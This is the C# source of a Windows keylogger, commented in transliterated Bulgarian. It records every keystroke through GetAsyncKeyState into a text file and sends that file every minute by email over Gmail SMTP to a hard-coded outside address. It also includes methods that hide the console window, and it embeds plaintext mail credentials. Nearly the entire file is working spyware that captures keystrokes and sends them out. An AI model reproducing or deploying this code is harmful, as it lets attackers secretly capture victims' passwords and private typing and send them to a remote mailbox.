using System;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Linq;

namespace KeyLogger
{
    interface IKeyChecks
    {
        void logKeyStrokes();
        void checkKeys(int keyCode);
        void SendEmail();
        void Stream(string data);
        void HideWindow();
        void ShowWindow();

    }

    public class KeyLog : IKeyChecks
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        static extern int GetAsyncKeyState(Int32 i);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        private string loggedData = String.Empty;


        /// <summary>
        /// METHOD KOITO IZPRASHTA CQLATA INFORMACIQ OT .TXT FILE-A PO IMEIL.
        /// </summary>
        public void SendEmail()
        {
            while (true)
            {
                using (MailMessage mail = new MailMessage())
                {

                    Thread.Sleep(60000);
                    StreamReader input = new StreamReader("../../input.txt");
                    string emailBody = input.ReadToEnd();
                    input.Close();

                    mail.From = new MailAddress("testmail13234@gmail.com");
                    mail.To.Add("babokob194@tsclip.com");
                    mail.Subject = "input data";
                    mail.Body = emailBody;
                    mail.IsBodyHtml = true;

                    using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtp.Credentials = new System.Net.NetworkCredential("testmail13234@gmail.com", "123test123");
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                    Console.WriteLine("Email sent!");
                    File.WriteAllText("../../input.txt", String.Empty);
                }
            }
        }
        /// <summary>
        /// METHOD KOITO ZAPISVA INFORMACIQTA VUV FAILA.
        /// </summary>
        /// <param name="data"></param>
        public void Stream(string data)
        {
            using (StreamWriter writer = File.AppendText("../../input.txt"))
            {
                writer.Write(data);
            }
        }
        /// <summary>
        /// METHOD KOITO VZIMA ASCII KODOVETE NA VUVEDENIQT KEYSTROKE
        /// </summary>
        public void logKeyStrokes()
        {
            while (true)
            {
                for (int i = 8; i < 255; i++)
                {
                    int KeyInput = GetAsyncKeyState(i);
                    if (KeyInput == 32769)
                    {
                        checkKeys(i);
                    }
                }

            }
        }
        /// <summary>
        /// METHOD KOITO PROVERQVA OPREDELENI SLUCHAI OT VHODA.
        /// </summary>
        /// <param name="keyCode"></param>
        public void checkKeys(int keyCode)
        {
            switch (keyCode)
            {
                case 8:
                    StreamReader input = new StreamReader("../../input.txt");
                    string fileBody = input.ReadToEnd();
                    input.Close();

                    fileBody = fileBody.Aggregate(string.Empty, (p, q) => p + q);
                    fileBody = fileBody.Substring(0, fileBody.Length - 1);

                    File.WriteAllText("../../input.txt", String.Empty);
                    Stream(fileBody);
                    break;

                case 9:
                    loggedData += "    ";
                    break;

                case 13:
                    loggedData += " {Enter} ";
                    break;

                case 16:
                    loggedData += " {Shift} ";
                    break;

                case 27:
                    loggedData += " {Esc} ";
                    break;

                case 91:
                    loggedData += " {WinB} ";
                    break;

                case 164:
                    loggedData += " {Alt} ";
                    break;

                case 162:
                    loggedData += " {Ctrl} ";
                    break;

                case 188:
                    loggedData += ",";
                    break;

                case 189:
                    loggedData += "-";
                    break;

                case 190:
                    loggedData += ".";
                    break;

                case 191:
                    loggedData += "/";
                    break;

                case 186:
                    loggedData += ";";
                    break;

                case 187:
                    loggedData += "=";
                    break;

                case 219:
                    loggedData += "[";
                    break;

                case 221:
                    loggedData += "]";
                    break;

                case 222:
                    loggedData += "'";
                    break;

                case 220:
                    loggedData += "\u005c";
                    break;


                default:
                    loggedData += (char)keyCode;
                    break;
            }

            if (loggedData.Length >= 0)
            {
                Console.Write(loggedData);
                Stream(loggedData.ToLower());
                loggedData = "";
            }
        }
        /// <summary>
        /// METHOD ZA SKRIVANE NA CONZOLATA
        /// </summary>
        public void HideWindow()
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
        }
        /// <summary>
        /// METHOD ZA POKAZVANE NA CONZOLATA
        /// </summary>
        public void ShowWindow()
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_SHOW);
        }
    }
    internal class Program
    {
        static void Main(string[] args)
        {
            KeyLog obj = new KeyLog();
            Thread thread = new Thread(new ThreadStart(obj.SendEmail));
            thread.Start();
            obj.logKeyStrokes();
            obj.ShowWindow();
        }

    }
}
